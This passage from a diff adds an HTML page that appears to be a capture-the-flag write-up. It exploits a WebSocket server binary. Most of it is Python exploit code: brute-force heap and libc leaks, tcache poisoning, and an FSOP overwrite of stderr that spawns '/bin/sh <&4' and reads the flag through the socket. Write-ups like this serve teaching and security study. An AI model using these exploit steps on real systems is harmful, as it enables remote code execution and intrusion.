+<span class="giallo-l"><span style="color: #BB9AF7;">			return</span><span style="color: #9ABDF5;"> ret</span><span style="color: #89DDFF;">;</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">		}</span></span>
+<span class="giallo-l"><span style="color: #9ABDF5;">}</span></span></code></pre>
+<p>here the <code>ws_send_frame</code> will return the frag_buf, so if the pointer is invalid it will SEGFAULT and return nothing, but if it's valid I will get a response and, thus, know that the byte I just tested is good.</p>
+<p>so this was the full leak code:</p>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="python"><span class="giallo-l"><span style="color: #BB9AF7;">def</span><span style="color: #7AA2F7;"> leak_heap_byte</span><span style="color: #9ABDF5;">(</span><span style="color: #E0AF68;">heap_partial</span><span style="color: #89DDFF;">,</span><span style="color: #E0AF68;"> byte_offset</span><span style="color: #9ABDF5;">):</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">    for</span><span> j</span><span style="color: #BB9AF7;"> in</span><span style="color: #7AA2F7;"> tqdm</span><span style="color: #9ABDF5;">(</span><span style="color: #0DB9D7;">range</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">0x</span><span style="color: #FF9E64;">100</span><span style="color: #9ABDF5;">))</span><span style="color: #89DDFF;">:</span></span>
+<span class="giallo-l"><span>        candidate</span><span style="color: #89DDFF;"> = (</span><span>heap_partial</span><span style="color: #BB9AF7;"> &lt;&lt;</span><span style="color: #FF9E64;"> 8</span><span style="color: #89DDFF;">)</span><span style="color: #BB9AF7;"> |</span><span> j</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">        arb_write</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">-</span><span style="color: #BB9AF7;">0x</span><span style="color: #FF9E64;">d8</span><span style="color: #89DDFF;"> +</span><span style="color: #C0CAF5;"> byte_offset</span><span style="color: #89DDFF;">,</span><span style="color: #C0CAF5;"> candidate</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">        ws_send</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">Op</span><span style="color: #89DDFF;">.</span><span style="color: #FF9E64;">CONTINUATION</span><span style="color: #89DDFF;">,</span><span style="color: #BB9AF7;"> b</span><span style="color: #89DDFF;">&quot;&quot;,</span><span style="color: #E0AF68;"> fin</span><span style="color: #89DDFF;">=</span><span style="color: #FF9E64;">True</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">        try</span><span style="color: #89DDFF;">:</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">            ws_recv</span><span style="color: #9ABDF5;">()</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">            reconnect</span><span style="color: #9ABDF5;">(</span><span style="color: #E0AF68;">enable_log</span><span style="color: #89DDFF;">=</span><span style="color: #FF9E64;">False</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">            return</span><span> candidate</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">        except</span><span style="color: #89DDFF;">:</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">            reconnect</span><span style="color: #9ABDF5;">(</span><span style="color: #E0AF68;">enable_log</span><span style="color: #89DDFF;">=</span><span style="color: #FF9E64;">False</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">def</span><span style="color: #7AA2F7;"> exploit</span><span style="color: #9ABDF5;">(</span><span style="color: #E0AF68;">ctx</span><span style="color: #89DDFF;">:</span><span> PwnContext</span><span style="color: #89DDFF;">,</span><span style="color: #E0AF68;"> ioctx</span><span style="color: #89DDFF;">:</span><span> IOContext</span><span style="color: #9ABDF5;">):</span></span>
+<span class="giallo-l"><span>    libc</span><span style="color: #89DDFF;"> =</span><span> ctx</span><span style="color: #89DDFF;">.</span><span>libc</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>    heap</span><span style="color: #89DDFF;"> =</span><span style="color: #FF9E64;"> 0</span></span>
+<span class="giallo-l"><span>    libc</span><span style="color: #89DDFF;">.</span><span>address</span><span style="color: #89DDFF;"> =</span><span style="color: #FF9E64;"> 0</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">    if not</span><span> heap</span><span style="color: #89DDFF;">:</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">        info</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">leaking heap</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">        for</span><span> i</span><span style="color: #BB9AF7;"> in</span><span style="color: #0DB9D7;"> range</span><span style="color: #9ABDF5;">(</span><span style="color: #FF9E64;">5</span><span style="color: #89DDFF;">, -</span><span style="color: #FF9E64;">1</span><span style="color: #89DDFF;">, -</span><span style="color: #FF9E64;">1</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">:</span></span>
+<span class="giallo-l"><span>            heap</span><span style="color: #89DDFF;"> =</span><span style="color: #7AA2F7;"> leak_heap_byte</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">heap</span><span style="color: #89DDFF;">,</span><span style="color: #C0CAF5;"> i</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #89DDFF;">    [</span><span style="color: #E0AF68;">...</span><span style="color: #89DDFF;">]</span></span></code></pre><h3 id="second-leak">Second leak</h3>
+<p>So now we could use our newly found addresse to leak some stuff on the heap, like fd/bk ptr from an unsorted bin freed chunk.</p>
+<p>To do so I've allocated a lot of stuff using 10 PING that would merge into a big chunk:</p>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="python"><span class="giallo-l"><span style="color: #BB9AF7;">    for</span><span> _</span><span style="color: #BB9AF7;"> in</span><span style="color: #0DB9D7;"> range</span><span style="color: #9ABDF5;">(</span><span style="color: #FF9E64;">10</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">:</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">        ws_send</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">Op</span><span style="color: #89DDFF;">.</span><span style="color: #FF9E64;">PING</span><span style="color: #89DDFF;">,</span><span style="color: #BB9AF7;"> b</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">A</span><span style="color: #89DDFF;">&quot; *</span><span style="color: #BB9AF7;"> 0x</span><span style="color: #FF9E64;">10</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">        ws_recv</span><span style="color: #9ABDF5;">()</span></span></code></pre>
+<p>And then a little read:</p>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="python"><span class="giallo-l"><span>    session</span><span style="color: #89DDFF;"> =</span><span style="color: #7AA2F7;"> flat</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">{</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">        0x</span><span style="color: #FF9E64;">0</span><span style="color: #89DDFF;">:</span><span style="color: #C0CAF5;"> target</span><span style="color: #89DDFF;">,</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">        -</span><span style="color: #C0CAF5;">idx</span><span style="color: #89DDFF;"> +</span><span style="color: #FF9E64;"> 10</span><span style="color: #89DDFF;">:</span><span style="color: #BB9AF7;"> b</span><span style="color: #89DDFF;">&quot;\x00&quot;,</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">    },</span><span style="color: #E0AF68;"> filler</span><span style="color: #89DDFF;">=</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&quot;\x00&quot;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    ws_send</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">Op</span><span style="color: #89DDFF;">.</span><span style="color: #FF9E64;">CONTINUATION</span><span style="color: #89DDFF;">,</span><span style="color: #C0CAF5;"> session</span><span style="color: #89DDFF;">,</span><span style="color: #E0AF68;"> fin</span><span style="color: #89DDFF;">=</span><span style="color: #FF9E64;">False</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span>    data</span><span style="color: #89DDFF;"> =</span><span style="color: #7AA2F7;"> arb_read</span><span style="color: #9ABDF5;">()</span></span>
+<span class="giallo-l"><span>    addr</span><span style="color: #89DDFF;"> =</span><span style="color: #7AA2F7;"> u64</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">data</span><span style="color: #9ABDF5;">[</span><span style="color: #89DDFF;">:</span><span style="color: #FF9E64;">8</span><span style="color: #9ABDF5;">])</span><span style="color: #89DDFF;"> -</span><span style="color: #BB9AF7;"> 0x</span><span style="color: #FF9E64;">1e7130</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">    reconnect</span><span style="color: #9ABDF5;">(</span><span style="color: #E0AF68;">enable_log</span><span style="color: #89DDFF;">=</span><span style="color: #FF9E64;">False</span><span style="color: #9ABDF5;">)</span></span></code></pre>
+<p>BUT, btw this isn't the end of our bf journey, here too we need to bf a bit to find the correct chunk's address, and that would also help me to clean up the heap leak like this:</p>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="python"><span class="giallo-l"><span style="color: #BB9AF7;">    if not</span><span> libc</span><span style="color: #89DDFF;">.</span><span>address</span><span style="color: #89DDFF;">:</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">        info</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ECE6A;">leaking libc</span><span style="color: #89DDFF;">&#39;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">        for</span><span> off</span><span style="color: #BB9AF7;"> in</span><span style="color: #0DB9D7;"> range</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">0x</span><span style="color: #FF9E64;">1000</span><span style="color: #89DDFF;">,</span><span style="color: #BB9AF7;"> 0x</span><span style="color: #FF9E64;">5000</span><span style="color: #89DDFF;">,</span><span style="color: #BB9AF7;"> 0x</span><span style="color: #FF9E64;">1000</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;">:</span></span>
+<span class="giallo-l"><span>            addr</span><span style="color: #89DDFF;"> =</span><span style="color: #7AA2F7;"> leak_libc</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">heap</span><span style="color: #89DDFF;">,</span><span style="color: #C0CAF5;"> off</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">            if</span><span> addr</span><span style="color: #89DDFF;">:</span></span>
+<span class="giallo-l"><span>                libc</span><span style="color: #89DDFF;">.</span><span>address</span><span style="color: #89DDFF;"> =</span><span> addr</span></span>
+<span class="giallo-l"><span>                heap</span><span style="color: #89DDFF;"> +=</span><span> off</span><span style="color: #89DDFF;"> -</span><span style="color: #BB9AF7;"> 0x</span><span style="color: #FF9E64;">3000</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">                printx</span><span style="color: #9ABDF5;">(</span><span style="color: #E0AF68;">libc</span><span style="color: #89DDFF;">=</span><span style="color: #C0CAF5;">libc</span><span style="color: #89DDFF;">.</span><span style="color: #C0CAF5;">address</span><span style="color: #89DDFF;">,</span><span style="color: #E0AF68;"> heap</span><span style="color: #89DDFF;">=</span><span style="color: #C0CAF5;">heap</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">                break</span></span></code></pre><h3 id="rce">RCE</h3>
+<p>Now we have all we need to get our flag, to do so I used a tcache poisoning attack to overwrite stderr and perform a FSOP with this command: <code>/bin/sh &lt;&amp;4</code> that allows me to gain a write-only shell.</p>
+<p>So to actually get the arb write onto the stderr struct I use the tcache poisoning to overwrite the <code>client-buf</code> ptr and thus allow me to write into stderr.</p>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="python"><span class="giallo-l"><span style="color: #51597D;font-style: italic;">        # allocate the victim chunk</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">        ws_send</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">Op</span><span style="color: #89DDFF;">.</span><span style="color: #FF9E64;">PONG</span><span style="color: #89DDFF;">,</span><span style="color: #BB9AF7;"> b</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">A</span><span style="color: #89DDFF;">&quot; *</span><span style="color: #BB9AF7;"> 0x</span><span style="color: #FF9E64;">20</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">        # + i is here to bf (yay) the tcache alignment</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">        # I don&#39;t really understand what&#39;s happening here</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">        # but it seems that when writing the target I would</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">        # get a random + or - value that broke the tcache</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">        # alignment and trigger a SIGABRT</span></span>
+<span class="giallo-l"><span>        target</span><span style="color: #89DDFF;"> =</span><span> heap</span><span style="color: #89DDFF;"> +</span><span style="color: #BB9AF7;"> 0x</span><span style="color: #FF9E64;">2a0</span><span style="color: #89DDFF;"> +</span><span> i</span><span style="color: #51597D;font-style: italic;"> # client struct addr</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">        # safelinking key</span></span>
+<span class="giallo-l"><span>        key</span><span style="color: #89DDFF;"> =</span><span> heap</span><span style="color: #BB9AF7;"> &gt;&gt;</span><span style="color: #FF9E64;"> 12</span></span>
+<span class="giallo-l"><span>        poison</span><span style="color: #89DDFF;"> =</span><span style="color: #7AA2F7;"> flat</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">{</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">            0x</span><span style="color: #FF9E64;">00</span><span style="color: #89DDFF;">:</span><span style="color: #C0CAF5;"> target</span><span style="color: #BB9AF7;"> ^</span><span style="color: #C0CAF5;"> key</span><span style="color: #89DDFF;">,</span><span style="color: #51597D;font-style: italic;"> # victim chunk&#39;s fd</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">            0x</span><span style="color: #FF9E64;">18</span><span style="color: #89DDFF;">:</span><span style="color: #BB9AF7;"> 0x</span><span style="color: #FF9E64;">21</span><span style="color: #89DDFF;">,</span><span style="color: #51597D;font-style: italic;"> # size</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">            0x</span><span style="color: #FF9E64;">20</span><span style="color: #89DDFF;">:</span><span style="color: #C0CAF5;"> key</span><span style="color: #89DDFF;">,</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">            0x</span><span style="color: #FF9E64;">38</span><span style="color: #89DDFF;">:</span><span style="color: #BB9AF7;"> 0x</span><span style="color: #FF9E64;">41</span><span style="color: #89DDFF;">,</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">            0x</span><span style="color: #FF9E64;">40</span><span style="color: #89DDFF;">:</span><span style="color: #C0CAF5;"> key</span><span style="color: #89DDFF;">,</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">            -</span><span style="color: #C0CAF5;">idx</span><span style="color: #89DDFF;"> +</span><span style="color: #BB9AF7;"> 0x</span><span style="color: #FF9E64;">28</span><span style="color: #89DDFF;">:</span><span style="color: #BB9AF7;"> b</span><span style="color: #89DDFF;">&quot;\x00&quot;,</span></span>
+<span class="giallo-l"><span style="color: #89DDFF;">        },</span><span style="color: #E0AF68;"> filler</span><span style="color: #89DDFF;">=</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&quot;\x00&quot;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">        sleep</span><span style="color: #9ABDF5;">(</span><span style="color: #FF9E64;">0.5</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">        ws_send</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">Op</span><span style="color: #89DDFF;">.</span><span style="color: #FF9E64;">CONTINUATION</span><span style="color: #89DDFF;">,</span><span style="color: #C0CAF5;"> poison</span><span style="color: #89DDFF;">,</span><span style="color: #E0AF68;"> fin</span><span style="color: #89DDFF;">=</span><span style="color: #FF9E64;">True</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">        # and then I&#39;m using op.TEXT with fin=False to get a double malloc</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">        # so the 2nd malloc give me my target ptr which is the client struct</span></span>
+<span class="giallo-l"><span>        client</span><span style="color: #89DDFF;"> =</span><span style="color: #7AA2F7;"> flat</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">0x</span><span style="color: #FF9E64;">4</span><span style="color: #89DDFF;">,</span><span style="color: #C0CAF5;"> libc</span><span style="color: #89DDFF;">.</span><span style="color: #C0CAF5;">sym</span><span style="color: #89DDFF;">.</span><span style="color: #FF9E64;">_IO_2_1_stderr_</span><span style="color: #89DDFF;">,</span><span style="color: #C0CAF5;"> heap</span><span style="color: #89DDFF;"> +</span><span style="color: #BB9AF7;"> 0x</span><span style="color: #FF9E64;">24e0</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">        ws_send</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">Op</span><span style="color: #89DDFF;">.</span><span style="color: #FF9E64;">TEXT</span><span style="color: #89DDFF;">,</span><span style="color: #C0CAF5;"> client</span><span style="color: #89DDFF;">,</span><span style="color: #E0AF68;"> fin</span><span style="color: #89DDFF;">=</span><span style="color: #FF9E64;">False</span><span style="color: #9ABDF5;">)</span></span></code></pre>
+<p>And now everything is ready for our final step, the FSOP:</p>
+<pre class="giallo" style="color: #A9B1D6; background-color: #1A1B26;"><code data-lang="python"><span class="giallo-l"><span style="color: #51597D;font-style: italic;">        # fsopsh is a function from https://github.com/Super-Botman/pwninit.py</span></span>
+<span class="giallo-l"><span style="color: #51597D;font-style: italic;">        # it generate a file struct that allow me to call system(arg)</span></span>
+<span class="giallo-l"><span>        stderr</span><span style="color: #89DDFF;"> =</span><span style="color: #7AA2F7;"> fsopsh</span><span style="color: #9ABDF5;">(</span><span style="color: #E0AF68;">file</span><span style="color: #89DDFF;">=</span><span style="color: #C0CAF5;">libc</span><span style="color: #89DDFF;">.</span><span style="color: #C0CAF5;">sym</span><span style="color: #89DDFF;">.</span><span style="color: #FF9E64;">_IO_2_1_stderr_</span><span style="color: #89DDFF;">,</span><span style="color: #E0AF68;"> arg</span><span style="color: #89DDFF;">=</span><span style="color: #BB9AF7;">b</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">/bin/sh &lt;&amp;4</span><span style="color: #89DDFF;">\x00&quot;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span>        stderr</span><span style="color: #89DDFF;"> =</span><span> stderr</span><span style="color: #9ABDF5;">[</span><span style="color: #89DDFF;">:</span><span style="color: #BB9AF7;">0x</span><span style="color: #FF9E64;">70</span><span style="color: #9ABDF5;">]</span><span style="color: #89DDFF;"> +</span><span style="color: #7AA2F7;"> p64</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">0x</span><span style="color: #FF9E64;">4</span><span style="color: #9ABDF5;">)</span><span style="color: #89DDFF;"> +</span><span> stderr</span><span style="color: #9ABDF5;">[</span><span style="color: #BB9AF7;">0x</span><span style="color: #FF9E64;">78</span><span style="color: #89DDFF;">:</span><span style="color: #9ABDF5;">]</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">        sl</span><span style="color: #9ABDF5;">(</span><span style="color: #C0CAF5;">stderr</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">        recv</span><span style="color: #9ABDF5;">(</span><span style="color: #BB9AF7;">0x</span><span style="color: #FF9E64;">2b</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">        sleep</span><span style="color: #9ABDF5;">(</span><span style="color: #FF9E64;">1</span><span style="color: #9ABDF5;">)</span><span style="color: #51597D;font-style: italic;"> # weird buffering things happening</span></span>
+<span class="giallo-l"><span style="color: #7AA2F7;">        sl</span><span style="color: #9ABDF5;">(</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ECE6A;">cat flag.txt &gt;&amp;4</span><span style="color: #89DDFF;">&quot;</span><span style="color: #9ABDF5;">)</span></span>
+<span class="giallo-l"><span style="color: #BB9AF7;">        return</span><span style="color: #7AA2F7;"> rl</span><span style="color: #9ABDF5;">()</span><span style="color: #89DDFF;">.</span><span style="color: #7AA2F7;">decode</span><span style="color: #9ABDF5;">()</span><span style="color: #89DDFF;">[:-</span><span style="color: #FF9E64;">1</span><span style="color: #89DDFF;">]</span></span></code></pre>
+<p>So here instead of using dup stuff I just used a little bash trick that allowed me to redirect the fd 4 (our socket fd) into the stdin of sh and then I redirect the stdout of cat into our fd again to get the flag</p>
+
+        </div>
+      </div>
+      <div class="prompt" id="terminal"><input
+    type="text"
+    id="setter"
+    onkeydown="writeit(this, event);moveIt(this.value.length, event)"
+    onchange="writeit(this, event)"
+    onkeyup="writeit(this, event)"
+    onkeypress="writeit(this, event);"
+    >
+<label for="setter" id="writer"> </label><b class="cursor" id="cursor"></b></div>
+    </main>
+  </body>
+
+</html>
